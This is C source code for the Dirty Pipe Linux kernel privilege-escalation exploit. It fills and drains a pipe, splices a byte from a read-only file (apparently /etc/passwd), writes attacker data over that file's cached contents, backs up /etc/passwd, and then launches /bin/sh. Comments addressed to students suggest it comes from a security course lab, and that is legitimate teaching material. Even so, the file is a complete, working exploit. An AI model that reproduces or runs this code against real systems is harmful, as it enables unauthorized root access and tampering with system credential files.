#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include "exploit.h"

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

void fill_pipe(int **pipe) {
	int *p = *pipe;
	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	// Students should implement this
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}
	
	
}

void drain_pipe(int **pipe) {
   	int *p = *pipe;
	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	// Students should implement this
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}
	
}

void corrupt_pipe(int p[2]){
	if (pipe(p)) abort();

	fill_pipe(&p);
	drain_pipe(&p);
}

void backup_passwd(){
    printf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");
    FILE *f1 = fopen("/etc/passwd", "r");
    FILE *f2 = fopen("/tmp/passwd.bak", "w");

    if (f1 == NULL) {
        printf("Failed to open /etc/passwd\n");
        exit(EXIT_FAILURE);
    } else if (f2 == NULL) {
        printf("Failed to open /tmp/passwd.bak\n");
        fclose(f1);
        exit(EXIT_FAILURE);
    }

    char c;
    while ((c = fgetc(f1)) != EOF)
        fputc(c, f2);

    fclose(f1);
    fclose(f2);
}

int main() {
    int p[2];
    int fd;
    loff_t offset;
    size_t data_size;
    struct stat st;
    
    // Backup /etc/passwd
    backup_passwd();
   
    offset = 4; 
	data_size = strlen(data);
	
	fd = open(path, O_RDONLY); //students
	fstat(fd, &st); //student; should be a hint
	corrupt_pipe(p);

	--offset;
	splice(fd, &offset, p[1], NULL, 1, 0); //student? 
	write(p[1], data, data_size); //student
	
    execv("/bin/sh", argv);
    printf("system() function call seems to have failed :(\n");
	return EXIT_FAILURE;
}
